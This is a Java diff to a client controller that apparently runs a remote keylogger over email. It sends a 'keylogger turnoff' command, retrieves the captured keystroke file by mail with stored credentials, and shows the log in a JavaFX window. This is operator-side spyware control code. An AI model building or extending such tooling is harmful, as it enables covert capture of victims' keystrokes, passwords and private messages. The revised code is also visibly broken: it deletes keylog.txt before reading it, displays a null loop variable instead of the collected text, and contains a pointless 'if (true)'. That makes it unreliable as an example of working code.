@@ -204,26 +204,36 @@ public class ClientController {
             });
             Thread newThread = new Thread(() -> {
                 send.sendContent("keylogger turnoff");
-                receive.receiveMail();
-                String text = receive.getText();
-                File oldfile = new File("src/main/resources/com/example/project/file/keylog.txt");
-                oldfile.delete();
-                File file = new File("src/main/resources/com/example/project/file/keylog.txt");
                 try {
-                    file.createNewFile();
-                    FileWriter write = new FileWriter(file);
-                    write.write(text);
-                    write.close();
-                } catch (IOException e) {
+                    Thread.sleep(10000);
+                } catch (InterruptedException e) {
                     throw new RuntimeException(e);
                 }
-                Platform.runLater(() -> {
-                    LogText.setText(text);
-                    buttonLogTurnOff.setDisable(false);
-                    buttonsaveasLog.setDisable(false);
-                    buttonLogTurnOn.setDisable(false);
-                });
+                receiveMail receive = new receiveMail(username,password);
+                receive.receiveFile();
+                if (true){
+                    File oldfile = new File("src/main/resources/com/example/project/file/keylog.txt");
+                    oldfile.delete();
+                    File file = new File("src/main/resources/com/example/project/file/keylog.txt");
+                    try (BufferedReader br = new BufferedReader(new FileReader(file))) {
+                        StringBuilder content = new StringBuilder();
+                        String text;
+                        while ((text = br.readLine()) != null) {
+                            content.append(text).append("\n");
+                        }
+                        String finalText = text;
+                        Platform.runLater(() -> {
+                            LogText.setText(finalText);
+                            buttonLogTurnOff.setDisable(false);
+                            buttonsaveasLog.setDisable(false);
+                            buttonLogTurnOn.setDisable(false);
+                        });
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
             });
+
             newThread.start();
         }
     }
